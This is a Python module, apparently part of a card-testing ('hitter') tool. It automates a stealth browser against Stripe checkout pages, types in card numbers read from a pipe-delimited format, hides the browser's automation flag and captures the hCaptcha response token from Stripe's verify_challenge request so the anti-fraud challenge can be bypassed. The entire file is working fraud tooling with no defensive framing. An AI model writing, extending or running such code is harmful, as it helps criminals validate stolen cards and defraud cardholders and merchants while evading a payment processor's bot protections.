"""
waf_solver.py — Playwright-driven Stripe WAF token harvester.

Launches a real Camoufox browser, navigates to the Stripe checkout page,
fills the card form, submits it, intercepts the hCaptcha challenge that
fires from Stripe's JS, and returns the captcha_response token.

Called from hitter_core.py PATH B.
"""

import asyncio
import json
import os
import sys
import urllib.parse
from typing import Optional, Tuple


# ── helpers ───────────────────────────────────────────────────────────────────

def _parse_card(raw: str) -> Tuple[str, str, str, str]:
    parts = raw.strip().split("|")
    if len(parts) == 4:
        num, mm, yy, cvv = parts
    elif len(parts) == 3:
        num, mm, yy = parts
        cvv = "111"
    else:
        num = parts[0]; mm, yy, cvv = "01", "30", "111"
    if len(yy) == 4:
        yy = yy[2:]
    return num, mm, yy, cvv


async def _fill_stripe_card_fields(page, card_num: str, mm: str, yy: str, cvv: str) -> bool:
    exp = f"{mm.zfill(2)} / {yy.zfill(2)}"
    filled_any = False

    # Strategy A: Check for top-level form inputs (modern Stripe Checkout Hosted layout)
    card_selectors = ["#cardNumber", "input[name='cardNumber']", "input[autocomplete='cc-number']"]
    for c_sel in card_selectors:
        try:
            inp = page.locator(c_sel).first
            if await inp.is_visible(timeout=1000):
                await inp.click()
                await inp.fill("")
                await inp.type(card_num, delay=40)
                filled_any = True
                print(f"[WAF SOLVER] Filled cardNumber via selector: {c_sel}")
                break
        except Exception:
            pass

    if filled_any:
        # Fill Expiry
        for e_sel in ["#cardExpiry", "input[name='cardExpiry']", "input[autocomplete='cc-exp']"]:
            try:
                inp = page.locator(e_sel).first
                if await inp.is_visible(timeout=1000):
                    await inp.click()
                    await inp.fill("")
                    await inp.type(exp, delay=40)
                    print(f"[WAF SOLVER] Filled cardExpiry via selector: {e_sel}")
                    break
            except Exception:
                pass

        # Fill CVC
        for cv_sel in ["#cardCvc", "input[name='cardCvc']", "input[autocomplete='cc-csc']"]:
            try:
                inp = page.locator(cv_sel).first
                if await inp.is_visible(timeout=1000):
                    await inp.click()
                    await inp.fill("")
                    await inp.type(cvv, delay=40)
                    print(f"[WAF SOLVER] Filled cardCvc via selector: {cv_sel}")
                    break
            except Exception:
                pass

        # Fill Cardholder Name if present
        for n_sel in ["#billingName", "input[name='billingName']", "input[autocomplete='cc-name']"]:
            try:
                inp = page.locator(n_sel).first
                if await inp.is_visible(timeout=500):
                    val = await inp.input_value()
                    if not val:
                        await inp.click()
                        await inp.fill("John Doe")
                        print(f"[WAF SOLVER] Filled billingName: John Doe")
                    break
            except Exception:
                pass

        return True

    # Strategy B: Walk child iframes (Elements legacy/embedded layout)
    all_frames = []
    def _collect(frame):
        all_frames.append(frame)
        for ch in frame.child_frames:
            _collect(ch)
    _collect(page.main_frame)

    for idx, fr in enumerate(all_frames):
        try:
            inputs = fr.locator("input")
            count = await inputs.count()
            if count >= 1:
                try:
                    first_inp = inputs.first
                    await first_inp.click(timeout=2000)
                    await asyncio.sleep(0.1)
                    await first_inp.fill("")
                    await first_inp.type(card_num, delay=40)
                    filled_any = True
                    print(f"[WAF SOLVER] Typed card number into Frame #{idx}")
                except Exception as _e1:
                    print(f"[WAF SOLVER] Card num fill error in Frame #{idx}: {_e1}")

                if count >= 3:
                    try:
                        exp_inp = inputs.nth(1)
                        await exp_inp.click(timeout=1500)
                        await exp_inp.fill("")
                        await exp_inp.type(exp, delay=40)

                        cvv_inp = inputs.nth(2)
                        await cvv_inp.click(timeout=1500)
                        await cvv_inp.fill("")
                        await cvv_inp.type(cvv, delay=40)
                    except Exception:
                        pass
        except Exception as _fe:
            pass

    return filled_any


# ── JS snippet to scrape captcha token from DOM (runs inside page context) ────
_JS_SCRAPE_TOKEN = """
() => {
    // 1. hCaptcha textarea response
    const textareas = document.querySelectorAll('textarea[name="h-captcha-response"]');
    for (const ta of textareas) {
        if (ta.value && ta.value.length > 20) return ta.value;
    }
    // 2. hcaptcha hidden input
    const hidden = document.querySelectorAll('input[name="h-captcha-response"]');
    for (const h of hidden) {
        if (h.value && h.value.length > 20) return h.value;
    }
    // 3. Stripe's captcha_response field injected into form
    const captchaInputs = document.querySelectorAll('input[name="captcha_response"]');
    for (const ci of captchaInputs) {
        if (ci.value && ci.value.length > 20) return ci.value;
    }
    // 4. Scan ALL iframes for hCaptcha response textarea
    try {
        for (const iframe of document.querySelectorAll('iframe')) {
            try {
                const iDoc = iframe.contentDocument || iframe.contentWindow.document;
                const iTA = iDoc.querySelectorAll('textarea[name="h-captcha-response"]');
                for (const ta of iTA) {
                    if (ta.value && ta.value.length > 20) return ta.value;
                }
            } catch(e) {}
        }
    } catch(e) {}
    return null;
}
"""


# ── main async solver ─────────────────────────────────────────────────────────

async def solve_stripe_waf_token(
    checkout_url: str,
    card_raw: str,
    timeout: float = 240.0,
    headless: bool = True,
) -> Tuple[Optional[str], Optional[dict]]:

    card_num, mm, yy, cvv = _parse_card(card_raw)
    captured_token: Optional[str] = None
    captured_body: Optional[dict] = None

    # Resolve camoufox vs plain playwright
    try:
        from camoufox.async_api import AsyncCamoufox
        _has_camoufox = True
    except ImportError:
        _has_camoufox = False

    if not _has_camoufox:
        try:
            from playwright.async_api import async_playwright
        except ImportError:
            print("[WAF SOLVER] Neither camoufox nor playwright found")
            return None, None

    _trawl_parent = os.path.normpath(
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..")
    )
    if _trawl_parent not in sys.path:
        sys.path.insert(0, _trawl_parent)

    # ── inner browser logic ───────────────────────────────────────────────────
    async def _run(page, context):
        nonlocal captured_token, captured_body
        intercepted_evt = asyncio.Event()

        # ── DUAL intercept: route handler + request event listener ────────────
        # Route handler catches the request BEFORE it leaves — can read post_data
        async def _route(route, request):
            nonlocal captured_token, captured_body
            if "verify_challenge" in request.url and request.method == "POST":
                try:
                    raw_body = request.post_data or ""
                    params = urllib.parse.parse_qs(raw_body)
                    tok = params.get("captcha_response", [None])[0]
                    if tok:
                        captured_token = tok
                        captured_body = {k: v[0] for k, v in params.items()}
                        print(f"[WAF SOLVER] [ROUTE] verify_challenge token intercepted ({len(tok)} chars)")
                        intercepted_evt.set()
                except Exception as e:
                    print(f"[WAF SOLVER] [ROUTE] parse error: {e}")
            await route.continue_()

        # Request event listener — fires for ALL requests including those
        # that Playwright's route() might miss due to timing
        def _on_request(request):
            nonlocal captured_token, captured_body
            if "verify_challenge" in request.url and request.method == "POST":
                try:
                    raw_body = request.post_data or ""
                    if raw_body:
                        params = urllib.parse.parse_qs(raw_body)
                        tok = params.get("captcha_response", [None])[0]
                        if tok and not captured_token:
                            captured_token = tok
                            captured_body = {k: v[0] for k, v in params.items()}
                            print(f"[WAF SOLVER] [EVENT] verify_challenge token captured ({len(tok)} chars)")
                            intercepted_evt.set()
                except Exception:
                    pass

        # Response event — catch token from the outgoing request post_data
        def _on_response(response):
            nonlocal captured_token
            if "verify_challenge" in response.url and not captured_token:
                # If we're here the request already fired — token may be in request post_data
                try:
                    req = response.request
                    raw_body = req.post_data or ""
                    if raw_body:
                        params = urllib.parse.parse_qs(raw_body)
                        tok = params.get("captcha_response", [None])[0]
                        if tok:
                            captured_token = tok
                            captured_body = {k: v[0] for k, v in params.items()}
                            print(f"[WAF SOLVER] [RESPONSE] verify_challenge token recovered ({len(tok)} chars)")
                            intercepted_evt.set()
                except Exception:
                    pass

        await page.route("**/*", _route)
        page.on("request", _on_request)
        page.on("response", _on_response)

        print("[WAF SOLVER] Navigating to Stripe checkout...")
        try:
            await page.goto(checkout_url, wait_until="domcontentloaded", timeout=120000)
        except Exception as e:
            print(f"[WAF SOLVER] goto warning: {e}")

        # ── Wait for Stripe Elements inputs to mount (up to 60s) ─────────────
        print("[WAF SOLVER] Waiting for Stripe Elements inputs to mount (up to 60s)...")
        filled_inputs_ready = False
        for _wait_idx in range(120):
            current_frames = page.frames
            total_inputs = 0
            for fr in current_frames:
                try:
                    cnt = await fr.locator("input").count()
                    total_inputs += cnt
                except Exception:
                    pass

            if total_inputs >= 1:
                print(f"[WAF SOLVER] Elements mounted! Total frames: {len(current_frames)}, Total inputs: {total_inputs}")
                filled_inputs_ready = True
                break
            await asyncio.sleep(0.5)

        if not filled_inputs_ready:
            print("[WAF SOLVER] Warning: Timed out waiting for inputs to mount")

        # ── Fill card form ────────────────────────────────────────────────────
        print("[WAF SOLVER] Filling card fields...")
        filled = await _fill_stripe_card_fields(page, card_num, mm, yy, cvv)
        print(f"[WAF SOLVER] filled_any={filled}")

        # Small pause to let Stripe.js validate the card fields
        await asyncio.sleep(1.5)

        # ── Click Pay button ──────────────────────────────────────────────────
        submitted = False
        for sel in [
            "button[data-testid='hosted-payment-submit-button']",
            "button[type='submit']",
            "button:has-text('Subscribe')",
            "button:has-text('Pay')",
            "button:has-text('Submit')",
            "form button",
        ]:
            try:
                btn = await page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    submitted = True
                    print(f"[WAF SOLVER] Submit clicked: {sel}")
                    break
            except Exception:
                pass
        if not submitted:
            print("[WAF SOLVER] Submit not found — pressing Enter")
            await page.keyboard.press("Enter")

        # ── Phase 1: Wait up to 30s for network intercept ────────────────────
        print("[WAF SOLVER] Phase 1: waiting for network intercept (30s)...")
        try:
            await asyncio.wait_for(intercepted_evt.wait(), timeout=30.0)
            print("[WAF SOLVER] Phase 1 success — token via network")
            return captured_token, captured_body
        except asyncio.TimeoutError:
            print("[WAF SOLVER] Phase 1 timeout — falling back to DOM poll")

        # ── Phase 2: DOM poll for captcha token (30 * 0.5s = 15s) ────────────
        print("[WAF SOLVER] Phase 2: DOM polling for h-captcha-response...")
        for _ in range(30):
            if captured_token:
                break
            try:
                tok_js = await page.evaluate(_JS_SCRAPE_TOKEN)
                if tok_js:
                    captured_token = tok_js
                    print(f"[WAF SOLVER] Phase 2 DOM poll found token ({len(tok_js)} chars)")
                    break
            except Exception:
                pass
            # Also check all frames
            for fr in page.frames:
                if captured_token:
                    break
                try:
                    tok_js = await fr.evaluate(_JS_SCRAPE_TOKEN)
                    if tok_js:
                        captured_token = tok_js
                        print(f"[WAF SOLVER] Phase 2 iframe DOM poll found token ({len(tok_js)} chars)")
                        break
                except Exception:
                    pass
            await asyncio.sleep(0.5)

        # ── Phase 3: Wait another 60s on network intercept (challenge may be slow) ──
        if not captured_token:
            print("[WAF SOLVER] Phase 3: extended network wait (60s)...")
            try:
                await asyncio.wait_for(intercepted_evt.wait(), timeout=60.0)
                print("[WAF SOLVER] Phase 3 success — token via network")
            except asyncio.TimeoutError:
                print("[WAF SOLVER] Phase 3 timeout — giving up")

        # Final DOM scrape attempt
        if not captured_token:
            try:
                tok_js = await page.evaluate(_JS_SCRAPE_TOKEN)
                if tok_js:
                    captured_token = tok_js
                    print(f"[WAF SOLVER] Final DOM scrape token ({len(tok_js)} chars)")
            except Exception:
                pass

        return captured_token, captured_body

    result_token, result_body = None, None

    if _has_camoufox:
        try:
            async with AsyncCamoufox(headless=headless, geoip=False, os=["windows"], enable_cache=True) as browser:
                ctx = await browser.new_context(locale="en-US", timezone_id="America/New_York")
                await ctx.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                """)
                page = await ctx.new_page()
                result_token, result_body = await _run(page, ctx)
        except Exception as e:
            print(f"[WAF SOLVER] Camoufox error: {e}")
    else:
        from playwright.async_api import async_playwright
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(headless=headless)
            ctx = await browser.new_context(locale="en-US", timezone_id="America/New_York")
            page = await ctx.new_page()
            result_token, result_body = await _run(page, ctx)
            await browser.close()

    print(f"[WAF SOLVER] Done. token={bool(result_token)}")
    return result_token, result_body


# ── sync wrapper for use from executor ───────────────────────────────────────

def solve_stripe_waf_token_sync(
    checkout_url: str,
    card_raw: str,
    timeout: float = 240.0,
    headless: bool = True,
) -> Tuple[Optional[str], Optional[dict]]:
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(
            solve_stripe_waf_token(checkout_url, card_raw, timeout=timeout, headless=headless)
        )
    finally:
        loop.close()


# ── standalone test ───────────────────────────────────────────────────────────

if __name__ == "__main__":
    import sys as _sys
    if len(_sys.argv) < 3:
        print("Usage: python waf_solver.py <checkout_url> <card>")
        _sys.exit(1)
    url = _sys.argv[1]
    card = _sys.argv[2]
    tok, body = solve_stripe_waf_token_sync(url, card, headless=False)
    print(f"\nToken: {tok}")
    print(f"Body: {body}")
